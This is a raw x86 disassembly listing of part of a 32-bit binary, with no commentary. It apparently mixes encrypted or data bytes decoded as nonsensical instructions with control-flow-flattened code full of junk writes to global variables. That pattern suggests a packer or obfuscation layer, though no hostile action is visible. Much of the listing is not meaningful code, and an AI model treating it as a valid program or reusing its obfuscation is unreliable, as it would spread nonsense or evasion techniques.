  409176:	cmp    DWORD PTR [ecx+0x11],esi
  409179:	or     DWORD PTR [edi],edi
  40917b:	mov    eax,ds:0x712808df
  409180:	in     eax,dx
  409181:	xor    DWORD PTR [ecx+0x56],esi
  409184:	cld    
  409185:	fisttp DWORD PTR [edx+0x5d]
  409188:	jge    0x409195
  40918a:	xor    BYTE PTR [ecx+0x10],dl
  40918d:	fst    DWORD PTR [edx+0x24]
  409190:	pause  
  409192:	or     al,0x68
  409194:	lods   al,BYTE PTR ds:[esi]
  409195:	add    esi,DWORD PTR [ebx]
  409197:	popf   
  409198:	retf   
  409199:	mov    es,WORD PTR [ebx+eiz*2+0x4928e86e]
  4091a0:	jae    0x4091fc
  4091a2:	jp     0x4091aa
  4091a4:	test   BYTE PTR [esi],bl
  4091a6:	(bad)  
  4091a7:	pop    eax
  4091a8:	stos   DWORD PTR es:[edi],eax
  4091a9:	mov    ebp,0xb6b6d458
  4091ae:	dec    edi
  4091af:	push   es
  4091b0:	mov    esp,0x8a894c44
  4091b5:	cmp    ebp,DWORD PTR [edi-0x4132c731]
  4091bb:	push   ebp
  4091bc:	or     al,0x53
  4091be:	daa    
  4091bf:	cmp    cl,BYTE PTR [edi+edx*2-0x39]
  4091c3:	xlat   BYTE PTR ds:[ebx]
  4091c4:	cs mov bl,0x93
  4091c7:	sub    DWORD PTR [ebx+0x6],ebx
  4091ca:	mov    dh,0x6d
  4091cc:	jns    0x409235
  4091ce:	leave  
  4091cf:	mov    ebx,0xf05dcb35
  4091d4:	cdq    
  4091d5:	loop   0x4091b5
  4091d7:	in     eax,0xef
  4091d9:	out    dx,eax
  4091da:	stos   BYTE PTR es:[edi],al
  4091db:	ror    dl,1
  4091dd:	cmp    al,BYTE PTR [edx+0x4012b0af]
  4091e3:	or     esi,DWORD PTR [ebx]
  4091e5:	out    0x6e,al
  4091e7:	(bad)  
  4091e8:	lods   al,BYTE PTR ds:[esi]
  4091e9:	dec    ebp
  4091ea:	xor    eax,DWORD PTR [edi+eax*1+0x6c70231a]
  4091f1:	xlat   BYTE PTR ds:[ebx]
  4091f2:	fwait
  4091f3:	mov    edi,0xa337015a
  4091f8:	mov    dl,0x8f
  4091fa:	add    DWORD PTR [eax],0x2dc1ae79
  409200:	mov    WORD PTR [ecx+0x5d9449bf],gs
  409206:	aam    0x9e
  409208:	push   esp
  409209:	bound  eax,QWORD PTR ds:[ebp-0x3c]
  40920d:	add    al,0x3b
  40920f:	inc    ecx
  409210:	or     ax,WORD PTR [edi+0x2a725ec1]
  409217:	mov    ebp,0xc0ff1477
  40921c:	in     eax,dx
  40921d:	(bad)  
  40921e:	cmp    ecx,ebp
  409220:	inc    ecx
  409221:	ret    0xb261
  409224:	inc    edx
  409225:	fs dec edi
  409227:	xor    BYTE PTR [edi-0x79cc6459],ah
  40922d:	xchg   esi,eax
  40922e:	xchg   esi,eax
  40922f:	jbe    0x4091fa
  409231:	sbb    BYTE PTR [ebx+0x37a8b997],dh
  409237:	addr16 loope 0x40926f
  40923a:	gs pushf 
  40923c:	jmp    0x409225
  40923e:	jmp    0x409207
  409240:	ror    al,1
  409242:	imul   edi,DWORD PTR [edi],0x2e
  409245:	aad    0xa5
  409247:	pushf  
  409248:	and    al,ch
  40924a:	dec    eax
  40924b:	pop    edi
  40924c:	mov    edx,0xb1c854d1
  409251:	jb     0x409292
  409253:	dec    ebx
  409254:	shr    BYTE PTR [ebx+0x44],1
  409257:	lock int 0xb1
  40925a:	ficom  DWORD PTR [esi-0x28]
  40925d:	cwde   
  40925e:	std    
  40925f:	sub    al,0x81
  409261:	and    al,0x1a
  409263:	push   0x260d1912
  409268:	in     al,0x41
  40926a:	pop    esi
  40926b:	xchg   ebx,eax
  40926c:	jno    0x409282
  40926e:	jbe    0x40922e
  409270:	imul   ecx,DWORD PTR [ebx],0x72
  409273:	sbb    al,0x73
  409275:	out    0x7,eax
  409277:	pop    edi
  409278:	inc    esp
  409279:	push   ds
  40927a:	pushf  
  40927b:	adc    eax,0xb791b705
  409280:	pusha  
  409281:	or     eax,0x36e525f3
  409286:	cmc    
  409287:	add    BYTE PTR [ebp-0x32],dl
  40928a:	pop    ebx
  40928b:	cmc    
  40928c:	fsubrp st(5),st
  40928e:	repz in eax,dx
  409290:	retf   0x8deb
  409293:	inc    eax
  409294:	pop    esi
  409295:	(bad)  
  409296:	out    dx,al
  409297:	mov    ebp,0x2a1c9abb
  40929c:	jp     0x40930d
  40929e:	xchg   ecx,eax
  40929f:	fbld   TBYTE PTR [esi+0x1d]
  4092a2:	icebp  
  4092a3:	xchg   ebx,eax
  4092a4:	sbb    eax,0x2fc951ac
  4092a9:	sar    WORD PTR [esp+eiz*8-0x9ee70bb],cl
  4092b1:	xor    bl,BYTE PTR [ebp+eax*8+0x2fa73c8b]
  4092b8:	pushf  
  4092b9:	and    edx,DWORD PTR [edx]
  4092bb:	jbe    0x409274
  4092bd:	jmp    esp
  4092bf:	xlat   BYTE PTR ds:[ebx]
  4092c0:	ss mov edi,0xf527e930
  4092c6:	jle    0x409301
  4092c8:	sbb    ebx,ebx
  4092ca:	jbe    0x4092de
  4092cc:	jns    0x40927a
  4092ce:	mov    ebp,0xf9f90c7e
  4092d3:	jmp    0xf42f:0xf8cbe69a
  4092da:	inc    eax
  4092db:	(bad)  
  4092dd:	mul    DWORD PTR ds:0x63b49051
  4092e3:	fs (bad) 
  4092e5:	adc    BYTE PTR [ebx],cl
  4092e7:	clc    
  4092e8:	sbb    esi,DWORD PTR [eax+eiz*2]
  4092eb:	lea    edx,[eax+0xc]
  4092ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092ef:	xchg   ebx,eax
  4092f0:	or     esp,DWORD PTR [ebp-0x1b26202e]
  4092f6:	scas   eax,DWORD PTR es:[edi]
  4092f7:	push   edx
  4092f8:	lods   al,BYTE PTR ds:[esi]
  4092f9:	or     DWORD PTR [ecx-0x5c381f44],0x90fe8c5b
  409303:	cmp    edi,DWORD PTR cs:[ebp-0x57]
  409307:	mov    ds:0x8637209b,al
  40930c:	hlt    
  40930d:	or     al,0xe7
  40930f:	sbb    al,0x6c
  409311:	aam    0xdb
  409313:	aaa    
  409314:	cmp    cl,bl
  409316:	test   bh,dh
  409318:	repz cmp esi,DWORD PTR [ebx+0x2f]
  40931c:	in     al,0x77
  40931e:	ror    BYTE PTR [esi+ecx*1],0x18
  409322:	out    0x67,al
  409324:	stos   BYTE PTR es:[edi],al
  409325:	cmc    
  409326:	push   edx
  409327:	xor    edx,ebp
  409329:	popa   
  40932a:	push   ebx
  40932b:	imul   edx,DWORD PTR [edi],0x4a4bfc1e
  409331:	push   eax
  409332:	mov    al,ds:0xd6d920c5
  409337:	jmp    0x409357
  409339:	dec    ebx
  40933a:	adc    DWORD PTR [esi],eax
  40933c:	jl     0x40939e
  40933e:	arpl   WORD PTR [ecx-0x13ba74a3],di
  409344:	jmp    0x4084bd
  409349:	mov    eax,DWORD PTR [ebp-0xc]
  40934c:	mov    edx,DWORD PTR [ebp-0x18]
  40934f:	xor    eax,edx
  409351:	cmp    eax,0xa08c1d35
  409356:	je     0x4084ba
  40935c:	mov    eax,DWORD PTR [ebp-0x10]
  40935f:	add    DWORD PTR [eax],0x7403501
  409365:	jmp    0x4084ba
  40936a:	mov    eax,DWORD PTR [ebp-0x1c]
  40936d:	cmp    DWORD PTR [eax],edi
  40936f:	je     0x4084ba
  409375:	mov    eax,0x800f1c9c
  40937a:	jmp    0x4084c1
  40937f:	push   ebp
  409380:	mov    ebp,esp
  409382:	sub    esp,0x60
  409385:	adc    eax,DWORD PTR ds:0x4336e3
  40938b:	jmp    0x4094bf
  409390:	add    al,0xbb
  409392:	js     0x4093e4
  409394:	inc    ebx
  409395:	push   ebx
  409396:	push   esp
  409397:	dec    ebx
  409398:	xor    al,0xcd
  40939a:	in     al,dx
  40939b:	(bad)  
  40939c:	repnz popf 
  40939e:	mov    WORD PTR [ebp+0x7c7ced9e],ss
  4093a4:	adc    eax,0x7e7c7c7f
  4093a9:	push   es
  4093aa:	adc    BYTE PTR [ebx+ebp*4],ch
  4093ad:	(bad)  
  4093af:	enter  0x1f13,0x6f
  4093b3:	ret    0x7050
  4093b6:	cmp    DWORD PTR [edx+0x28],ebx
  4093b9:	sub    eax,0x8c3e2fb3
  4093be:	gs dec esi
  4093c0:	jle    0x40940a
  4093c2:	sub    al,0x8a
  4093c4:	push   ecx
  4093c5:	imul   ebp,DWORD PTR [ebx],0x56011266
  4093cb:	inc    edi
  4093cc:	push   ecx
  4093cd:	mov    bl,0x4f
  4093cf:	or     cl,BYTE PTR [ecx+edx*2-0x4a]
  4093d3:	pop    ebx
  4093d4:	outs   dx,BYTE PTR ds:[esi]
  4093d5:	popa   
  4093d6:	enter  0x5485,0x88
  4093da:	inc    ebx
  4093db:	mov    dh,0x45
  4093dd:	pop    esp
  4093de:	adc    DWORD PTR [eax],eax
  4093e0:	inc    esi
  4093e1:	push   ebp
  4093e2:	adc    eax,0x48c45be4
  4093e7:	add    BYTE PTR [ecx+0x1e01e306],0x2f
  4093ee:	popf   
  4093ef:	je     0x40946f
  4093f1:	pop    ebx
  4093f2:	aas    
  4093f3:	push   es
  4093f4:	fwait
  4093f5:	rcr    ch,cl
  4093f7:	cmp    eax,esi
  4093f9:	loope  0x409393
  4093fb:	xor    eax,DWORD PTR [esi+0x7874bef4]
  409401:	add    BYTE PTR [ebx+0x4f8a3b2],0x66
  409408:	add    al,0xbd
  40940a:	clc    
  40940b:	and    ebx,DWORD PTR [ebx]
  40940d:	fcmovu st,st(6)
  40940f:	mov    ch,0x93
  409411:	lea    ebx,[ebx+0x18]
  409414:	call   0xe85a:0xda1bc372
  40941b:	mov    ah,BYTE PTR [ebp+0x3335934f]
  409421:	inc    esp
  409422:	gs xchg edx,eax
  409424:	imul   ebp,ebx,0x8b68b9f7
  40942a:	loope  0x409400
  40942c:	or     BYTE PTR [eax],0x2e
  40942f:	or     BYTE PTR cs:[edx+0x46f83f2c],al
  409436:	mov    dl,0xa5
  409438:	(bad)  
  409439:	mov    edi,0x7b1cbb8f
  40943e:	push   0x5e1c2a44
  409443:	lods   eax,DWORD PTR ds:[esi]
  409444:	pushf  
  409445:	das    
  409446:	ins    DWORD PTR es:[edi],dx
  409447:	daa    
  409448:	adc    DWORD PTR [eax],ecx
  40944a:	ret    0x12b4
  40944d:	aaa    
  40944e:	adc    BYTE PTR [eax+0x1258855e],al
  409454:	popf   
  409455:	sbb    BYTE PTR [ecx+ebx*2+0x38abed1a],0xef
  40945d:	and    BYTE PTR [ecx-0x62b2ce95],bl
  409463:	inc    edx
  409464:	loope  0x409425
  409466:	aam    0xe3
  409468:	dec    ecx
  409469:	cmp    al,0x5c
  40946b:	cmp    ch,BYTE PTR [esi]
  40946d:	mov    bh,0x6e
  40946f:	into   
  409470:	pop    ss
  409471:	mov    esi,edi
  409473:	mov    eax,0x964b464
  409478:	jecxz  0x4094a4
  40947a:	sub    al,0xd8
  40947c:	clc    
  40947d:	test   BYTE PTR [ebx],al
  40947f:	sub    eax,0xaab20506
  409484:	mov    cl,BYTE PTR [esp+ebp*4-0x6762223]
  40948b:	push   ebx
  40948c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40948d:	cmp    eax,0xea0910a4
  409492:	nop
  409493:	adc    BYTE PTR [ebp+0x35],ah
  409496:	jecxz  0x40950e
  409498:	mov    al,ds:0x707c54f3
  40949d:	cmp    edi,esi
  40949f:	stc    
  4094a0:	sahf   
  4094a1:	mov    al,0xaf
  4094a3:	mov    ebx,0xc7fac40a
  4094a8:	test   eax,0xa3c6f8a1
  4094ad:	cmp    eax,0x6e3708b3
  4094b2:	adc    al,0x42
  4094b4:	enter  0x8f00,0xdb
  4094b8:	mov    al,ds:0xc30642c3
  4094bd:	add    DWORD PTR ds:0x8108458b,esp
  4094c3:	or     eax,0x4336e7
  4094c8:	cmp    BYTE PTR [eax+eax*1],cl
  4094cb:	add    BYTE PTR [ebx-0x7f],dl
  4094ce:	adc    eax,0x433657
  4094d3:	inc    edi
  4094d4:	popa   
  4094d5:	add    BYTE PTR [eax],al
  4094d7:	push   esi
  4094d8:	mov    esi,0x7510853
  4094dd:	add    DWORD PTR ds:0x433767,0x296a
  4094e7:	xor    eax,esi
  4094e9:	and    ebx,0x43d6
  4094ef:	mov    ebx,0x32729a
  4094f4:	and    DWORD PTR ds:0x43365f,0x433657
  4094fe:	add    eax,ebx
  409500:	adc    DWORD PTR ds:0x43375f,0x1959
  40950a:	push   edi
  40950b:	or     DWORD PTR ds:0x4336ab,ecx
  409511:	mov    DWORD PTR [ebp-0x18],eax
  409514:	and    DWORD PTR ds:0x43365b,0x4f47
  40951e:	mov    edi,DWORD PTR [ebp+0x8]
  409521:	xor    edi,esi
  409523:	sbb    DWORD PTR ds:0x4336af,0x43376b
  40952d:	mov    DWORD PTR [ebp-0xc],0xf89c85f5
  409534:	or     DWORD PTR ds:0x4336af,0x30d7
  40953e:	mov    DWORD PTR [ebp-0x10],0xf89c8735
  409545:	add    DWORD PTR ds:0x433667,0x43372f
  40954f:	add    edi,ebx
  409551:	jmp    0x4099a2
  409556:	mov    DWORD PTR ds:0x433697,0x217e
  409560:	cmp    edi,0x40
  409563:	mov    DWORD PTR ds:0x4336ef,0x49f
  40956d:	jne    0x4095a6
  409573:	mov    DWORD PTR ds:0x43376b,ecx
  409579:	mov    eax,ds:0x413996
  40957e:	mov    eax,DWORD PTR [eax]
  409580:	mov    DWORD PTR ds:0x433663,0x21e9
  40958a:	mov    DWORD PTR [ebp-0x14],eax
  40958d:	mov    eax,ds:0x413b9e
  409592:	mov    DWORD PTR ds:0x43372f,0x54b7
  40959c:	mov    eax,DWORD PTR [eax]
  40959e:	mov    DWORD PTR [ebp-0x18],eax
  4095a1:	jmp    0x409996
  4095a6:	mov    DWORD PTR ds:0x43364b,0x76e8
  4095b0:	jmp    0x4096e4
  4095b5:	and    al,0x36
  4095b7:	popf   
  4095b8:	les    ebx,FWORD PTR [ebp-0x6f09829d]
  4095be:	lahf   
  4095bf:	jmp    0x40958c
  4095c1:	in     eax,dx
  4095c2:	pop    ebp
  4095c3:	xchg   ebp,eax
  4095c4:	(bad)  
  4095c5:	mov    bh,0xec
  4095c7:	jl     0x409645
  4095c9:	adc    eax,0xd17c7c7f
  4095ce:	dec    eax
  4095cf:	sbb    DWORD PTR [eax-0x41e253eb],eax
  4095d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095d6:	dec    esp
  4095d7:	stos   BYTE PTR es:[edi],al
  4095d8:	fbld   TBYTE PTR [edi]
  4095da:	xor    dh,BYTE PTR [esi+edx*8+0x69406f9a]
  4095e1:	rcr    cl,cl
  4095e3:	push   ebp
  4095e4:	loope  0x409583
  4095e6:	daa    
  4095e7:	int3   
  4095e8:	mov    ss,WORD PTR [ebx+0x24]
  4095eb:	cli    
  4095ec:	das    
  4095ed:	test   DWORD PTR [edi],eax
  4095ef:	jle    0x4095a3
  4095f1:	adc    al,0x50
  4095f3:	test   al,0xb5
  4095f5:	into   
  4095f6:	jns    0x4095a3
  4095f8:	inc    edi
  4095f9:	jbe    0x409656
  4095fb:	jnp    0x409610
  4095fd:	gs push ebp
  4095ff:	mov    ds:0xeaaac865,eax
  409604:	sar    BYTE PTR [edx-0x2fa53416],0xf2
  40960b:	aaa    
  40960c:	mov    bh,0x2
  40960e:	mov    al,ds:0x2d1bf994
  409613:	sbb    DWORD PTR [ebx],esi
  409615:	mov    al,0x3a
  409617:	dec    esi
  409618:	push   ebx
  409619:	loope  0x40959b
  40961b:	xchg   edi,eax
  40961c:	mov    eax,0x88e041bb
  409621:	stos   DWORD PTR es:[edi],eax
  409622:	mov    eax,0xfae6ee84
  409627:	popa   
  409628:	jns    0x4095c3
  40962a:	(bad)  
  40962b:	mov    ebx,0xf3295d96
  409630:	call   0x13e8:0xe1645a92
  409637:	xor    BYTE PTR [ecx-0x7fac4413],dh
  40963d:	mov    dl,0x16
  40963f:	pop    esp
  409640:	stos   BYTE PTR es:[edi],al
  409641:	xor    ebx,DWORD PTR [ecx-0x7c525d88]
  409647:	fsubr  DWORD PTR [eax]
  409649:	pop    eax
  40964a:	add    ebx,ebx
  40964c:	loopne 0x409646
  40964e:	mov    ?,WORD PTR [ebp+0x655ac9aa]
  409654:	xchg   esp,eax
  409655:	adc    edi,esp
  409657:	push   0x5a251061
  40965c:	mov    al,ds:0xfcc92059
  409661:	(bad)  
  409662:	rcr    bl,cl
  409664:	mov    ebx,0xa2588e44
  409669:	fucomp st(0)
  40966b:	ret    0xea3e
  40966e:	jecxz  0x40969b
  409670:	scas   al,BYTE PTR es:[edi]
  409671:	xchg   edx,eax
  409672:	mov    al,ds:0x68641deb
  409677:	cdq    
  409678:	push   0x7e363e91
  40967d:	cmp    ah,ah
  40967f:	sbb    eax,0x88c625a9
  409684:	das    
  409685:	sub    edi,esi
  409687:	imul   edi,DWORD PTR [edx-0x7c],0x75
  40968b:	inc    eax
  40968c:	sbb    al,0x8d
  40968e:	in     eax,dx
  40968f:	popf   
  409690:	retf   0xced
  409693:	sbb    DWORD PTR [eax+0x7777dfa2],edi
  409699:	inc    eax
  40969a:	xor    dh,BYTE PTR [edx+0x7af992e]
  4096a0:	jg     0x409626
  4096a2:	jp     0x4096e4
  4096a4:	push   cs
  4096a5:	mov    eax,DWORD PTR [edx-0x6e71e81c]
  4096ab:	and    ebx,edi
  4096ad:	jge    0x4096f4
  4096af:	adc    dl,BYTE PTR [ebp-0x220371a6]
  4096b5:	push   edx
  4096b6:	arpl   ax,bp
  4096b8:	gs scas al,BYTE PTR es:[edi]
  4096ba:	cwde   
  4096bb:	xchg   DWORD PTR [eax],esi
  4096bd:	out    dx,eax
  4096be:	mov    ds,WORD PTR [edx]
  4096c0:	lock ret 
  4096c2:	ins    DWORD PTR es:[edi],dx
  4096c3:	lock push cs
  4096c5:	call   0x9fdc:0x29f3d764
  4096cc:	outs   dx,BYTE PTR ds:[esi]
  4096cd:	aas    
  4096ce:	mov    ds:0xa0a9c361,al
  4096d3:	inc    eax
  4096d4:	je     0x4096a7
  4096d6:	xchg   ecx,eax
  4096d7:	cmp    BYTE PTR [edi-0x5c],bh
  4096da:	pop    esp
  4096db:	fwait
  4096dc:	xchg   DWORD PTR [edx+0x2a63b443],esi
  4096e2:	mov    ah,0xc5
  4096e4:	cmp    edi,0x33d
  4096ea:	mov    DWORD PTR ds:0x4336d7,0x197
  4096f4:	jne    0x409766
  4096fa:	and    DWORD PTR [ebp+0x8],0x0
  4096fe:	mov    eax,DWORD PTR [ebp-0x8]
  409701:	or     DWORD PTR ds:0x433723,0x4336e3
  40970b:	sub    eax,DWORD PTR [ebp+0x8]
  40970e:	push   eax
  40970f:	mov    eax,ds:0x433763
  409714:	or     DWORD PTR ds:0x433723,eax
  40971a:	mov    eax,DWORD PTR [ebp-0x4]
  40971d:	add    DWORD PTR ds:0x43363f,0x4336af
  409727:	add    eax,DWORD PTR [ebp+0x8]
  40972a:	sub    DWORD PTR ds:0x433727,0x4336a7
  409734:	push   eax
  409735:	dec    DWORD PTR ds:0x43364b
  40973b:	call   0x4099bc
  409740:	mov    DWORD PTR ds:0x433717,0x29a7
  40974a:	inc    DWORD PTR [ebp+0x8]
  40974d:	cmp    DWORD PTR [ebp+0x8],0x52
  409751:	mov    DWORD PTR ds:0x43365f,0x7d48
  40975b:	jb     0x4096fe
  409761:	jmp    0x409996
  409766:	mov    DWORD PTR ds:0x4336ef,0x5779
  409770:	cmp    edi,0x1a3
  409776:	mov    DWORD PTR ds:0x433767,0x175d
  409780:	jne    0x409964
  409786:	movzx  eax,BYTE PTR ds:0x43363f
  40978d:	and    DWORD PTR ds:0x4336af,eax
  409793:	mov    DWORD PTR [ebp-0x60],0xf89c8539
  40979a:	add    DWORD PTR ds:0x43372f,ebx
  4097a0:	mov    eax,DWORD PTR [ebp-0x4]
  4097a3:	xor    DWORD PTR ds:0x43369f,0x2808
  4097ad:	mov    DWORD PTR [ebp-0x5c],eax
  4097b0:	sub    eax,DWORD PTR ds:0x4336e7
  4097b6:	mov    eax,DWORD PTR [ebp-0x8]
  4097b9:	mov    DWORD PTR [ebp-0x58],eax
  4097bc:	mov    eax,DWORD PTR [ebp-0xc]
  4097bf:	xor    eax,esi
  4097c1:	and    DWORD PTR ds:0x433727,0x5f09
  4097cb:	add    eax,ebx
  4097cd:	and    DWORD PTR ds:0x43365f,0x3046
  4097d7:	mov    DWORD PTR [ebp-0x54],eax
  4097da:	sbb    DWORD PTR ds:0x4336eb,0x433733
  4097e4:	lea    eax,[ebp-0x1c]
  4097e7:	add    DWORD PTR ds:0x43371b,0x7d23
  4097f1:	mov    DWORD PTR [ebp-0x50],eax
  4097f4:	sub    eax,DWORD PTR ds:0x43365f
  4097fa:	mov    eax,DWORD PTR [ebp-0x60]
  4097fd:	or     DWORD PTR ds:0x4336b3,0x4336af
  409807:	xor    eax,esi
  409809:	add    eax,ebx
  40980b:	mov    DWORD PTR [ebp-0x60],eax
  40980e:	lea    eax,[ebp-0x60]
  409811:	push   eax
  409812:	mov    eax,DWORD PTR [ebp+0xc]
  409815:	jmp    0x409949
  40981a:	xchg   cl,bl
  40981c:	fs jg  0x409886
  40981f:	and    DWORD PTR [ecx+0x61],0x87fe859e
  409826:	mov    DWORD PTR [edx-0x78],ecx
  409829:	sub    eax,0x7c7cef4c
  40982e:	adc    eax,0xe47c7c7f
  409833:	cmp    BYTE PTR [ecx-0x2cd266a3],al
  409839:	xchg   esi,eax
  40983a:	push   cs
  40983b:	add    al,0xca
  40983d:	push   ds
  40983e:	xchg   esi,eax
  40983f:	sar    BYTE PTR [esi],0xcd
  409842:	inc    ebp
  409843:	jbe    0x409883
  409845:	out    dx,eax
  409846:	in     al,0xc
  409848:	jecxz  0x40986f
  40984a:	repnz sub al,0xe
  40984d:	xchg   BYTE PTR [esi+0x1783153b],dl
  409853:	push   es
  409854:	ficom  DWORD PTR [eax]
  409856:	aam    0xa8
  409858:	or     eax,esp
  40985a:	xor    DWORD PTR [edx+0x783929cf],edi
  409860:	gs ins BYTE PTR es:[edi],dx
  409862:	mov    edi,0xfa9613f9
  409867:	sbb    DWORD PTR [ebx-0x61],edi
  40986a:	fstp   QWORD PTR [edi-0x53]
  40986d:	xchg   bl,al
  40986f:	or     eax,0xc9d92bd
  409874:	enter  0x47f6,0xb3
  409878:	outs   dx,DWORD PTR ds:[esi]
  409879:	data16 adc al,0x4
  40987c:	xchg   dh,bl
  40987e:	les    ebp,FWORD PTR [esi]
  409880:	loope  0x409830
  409882:	add    BYTE PTR [ebx+ebp*1-0x35],dh
  409886:	sub    ah,BYTE PTR [ecx]
  409888:	aaa    
  409889:	leave  
  40988a:	add    BYTE PTR [edx-0x72e520b3],0x10
  409891:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409892:	out    0x34,al
  409894:	push   ebp
  409895:	mov    cl,0x19
  409897:	sub    eax,0xfc018055
  40989c:	aam    0xe1
  40989e:	fmul   QWORD PTR [edx-0x7ce02131]
  4098a4:	adc    BYTE PTR [edi-0x2c],bh
  4098a7:	cli    
  4098a8:	xor    DWORD PTR [esp+ebx*8],edi
  4098ab:	jmp    0xbbf4:0x2a93242f
  4098b2:	(bad)  
  4098b3:	scas   al,BYTE PTR es:[edi]
  4098b4:	add    BYTE PTR [edx],0xb7
  4098b7:	fild   QWORD PTR [edx]
  4098b9:	push   esi
  4098ba:	sub    DWORD PTR ds:0xe5f704d4,ebp
  4098c0:	int3   
  4098c1:	mov    esi,0xb58f413e
  4098c6:	xchg   ebx,eax
  4098c7:	or     eax,0x2153916e
  4098cc:	push   es
  4098cd:	xchg   edi,eax
  4098ce:	xchg   ecx,eax
  4098cf:	lahf   
  4098d0:	pmullw mm4,QWORD PTR [ecx+0x661a6b56]
  4098d7:	jecxz  0x4098c7
  4098d9:	mov    WORD PTR [ecx+0x1df7f0be],?
  4098df:	push   0x734dd610
  4098e4:	jl     0x409897
  4098e6:	push   ebx
  4098e7:	fcmove st,st(2)
  4098e9:	push   esp
  4098ea:	sub    DWORD PTR [esi+0x32b32afa],esp
  4098f0:	mov    bh,0x97
  4098f2:	and    BYTE PTR ds:0xa9921bbc,0xf4
  4098f9:	push   ebx
  4098fa:	sub    eax,0x6c6ded67
  4098ff:	adc    cl,BYTE PTR [ebp+0x5414f1a9]
  409905:	imul   esi,ebx,0xffffff80
  409908:	(bad)  
  409909:	xor    al,0xfd
  40990b:	and    dh,cl
  40990d:	cmp    al,0x27
  40990f:	and    eax,0xef3cbf16
  409914:	pop    eax
  409915:	inc    eax
  409916:	cdq    
  409917:	sbb    ecx,DWORD PTR [eax-0x72568df2]
  40991d:	nop
  40991e:	std    
  40991f:	and    ch,al
  409921:	lahf   
  409922:	push   edx
  409923:	repnz int3 
  409925:	and    al,0x2e
  409927:	sbb    ecx,DWORD PTR [ebp+0x6ed5dcf7]
  40992d:	call   0xde2a13a8
  409932:	stos   DWORD PTR es:[edi],eax
  409933:	jb     0x4099a6
  409935:	mov    al,ds:0x1a11fb1
  40993a:	inc    esi
  40993b:	push   ebp
  40993c:	jmp    0xc8abb176
  409941:	jns    0x4099b0
  409943:	jnp    0x4098e3
  409945:	mov    ch,0xac
  409947:	adc    DWORD PTR [ebp+0x33],ecx
  40994a:	mov    BYTE PTR [ebx],0xc3
  40994d:	push   eax
  40994e:	mov    eax,ds:0x413b36
  409953:	push   0x413a8c
  409958:	push   DWORD PTR [eax]
  40995a:	call   0x4100b5
  40995f:	jmp    0x409996
  409964:	cmp    edi,0x13d
  40996a:	jne    0x409996
  409970:	mov    eax,DWORD PTR [ebp-0x10]
  409973:	xor    eax,esi
  409975:	add    eax,ebx
  409977:	mov    DWORD PTR [ebp+0x8],eax
  40997a:	mov    eax,ds:0x413b16
  40997f:	mov    DWORD PTR [ebp+0x8],eax
  409982:	mov    eax,DWORD PTR [ebp-0x14]
  409985:	mov    DWORD PTR [ebp-0x4],eax
  409988:	mov    eax,DWORD PTR [ebp-0x4]
  40998b:	push   0x4
  40998d:	pop    ecx
  40998e:	sub    ecx,eax
  409990:	add    ecx,DWORD PTR [ebp-0x18]
  409993:	mov    DWORD PTR [ebp-0x8],ecx
  409996:	mov    eax,DWORD PTR [ebp+0xc]
  409999:	xor    eax,esi
  40999b:	lea    edi,[edi+eax*1+0x32729a]
  4099a2:	cmp    edi,0x50b
  4099a8:	jne    0x409556
  4099ae:	mov    eax,DWORD PTR [ebp+0xc]
  4099b1:	pop    edi
  4099b2:	xor    eax,esi
  4099b4:	pop    esi
  4099b5:	add    eax,ebx
  4099b7:	pop    ebx
  4099b8:	leave  
  4099b9:	ret    0x8
  4099bc:	push   ebp
  4099bd:	mov    ebp,esp
  4099bf:	sub    esp,0x44
  4099c2:	neg    edx
  4099c4:	push   edi
  4099c5:	mov    eax,DWORD PTR [ebp+0xc]
  4099c8:	mov    edi,DWORD PTR ds:0x433733
  4099ce:	sub    DWORD PTR ds:0x43363f,edi
  4099d4:	mov    DWORD PTR [ebp-0x10],eax
  4099d7:	and    DWORD PTR ds:0x4336ef,0x1af7
  4099e1:	mov    eax,DWORD PTR [ebp+0x8]
  4099e4:	mov    DWORD PTR [ebp+0x8],0xf89c8535
  4099eb:	and    DWORD PTR ds:0x43372f,ebx
  4099f1:	mov    DWORD PTR [ebp-0x20],0xf89c8534
  4099f8:	or     DWORD PTR ds:0x4336b3,ebx
  4099fe:	mov    edx,DWORD PTR [ebp+0x8]
  409a01:	add    DWORD PTR ds:0x43364f,ebx
  409a07:	mov    DWORD PTR [ebp-0x40],eax
  409a0a:	mov    eax,0x7510853
  409a0f:	mov    DWORD PTR ds:0x4336e3,0x1e
  409a19:	cmp    DWORD PTR ds:0x4336e3,0x0
  409a20:	je     0x409a5e
  409a26:	cmp    DWORD PTR ds:0x4336e3,0x20
  409a2d:	jne    0x409a46
  409a33:	push   DWORD PTR [ebp-0xc]
  409a36:	push   0x43371b
  409a3b:	push   0x4dbc
  409a40:	call   DWORD PTR ds:0x412198
  409a46:	mov    edi,DWORD PTR ds:0x4336e3
  409a4c:	dec    edi
  409a4d:	mov    DWORD PTR ds:0x4336e3,edi
  409a53:	jmp    0x409a19
  409a58:	sbb    DWORD PTR ds:0x433773,ebx
  409a5e:	xor    edx,eax
  409a60:	and    DWORD PTR ds:0x4336db,0x1370
  409a6a:	mov    ecx,0x32729a
  409a6f:	xor    edi,DWORD PTR ds:0x433653
  409a75:	add    edx,ecx
  409a77:	adc    edi,0x4100
  409a7d:	mov    DWORD PTR [ebp-0x8],edx
  409a80:	mov    DWORD PTR ds:0x43363f,0x11
  409a8a:	cmp    DWORD PTR ds:0x43363f,0x0
  409a91:	je     0x409aec
  409a97:	cmp    DWORD PTR ds:0x43363f,0x6
  409a9e:	jne    0x409ab4
  409aa4:	push   0x53f1
  409aa9:	push   0x7cf0
  409aae:	call   DWORD PTR ds:0x412260
  409ab4:	cmp    DWORD PTR ds:0x43363f,0x7
  409abb:	jne    0x409ad0
  409ac1:	xor    edi,edi
  409ac3:	add    edi,DWORD PTR ds:0x43363f
  409ac9:	dec    edi
  409aca:	mov    DWORD PTR ds:0x43363f,edi
  409ad0:	mov    edi,DWORD PTR ds:0x43363f
  409ad6:	dec    edi
  409ad7:	mov    DWORD PTR ds:0x43363f,edi
  409add:	jmp    0x409a8a
  409ae2:	add    DWORD PTR ds:0x43372b,0x300c
  409aec:	mov    edx,DWORD PTR [ebp+0x8]
  409aef:	and    DWORD PTR ds:0x4336a3,0x0
  409af9:	jmp    0x409b0b
  409afe:	mov    edi,DWORD PTR ds:0x4336a3
  409b04:	inc    edi
  409b05:	mov    DWORD PTR ds:0x4336a3,edi
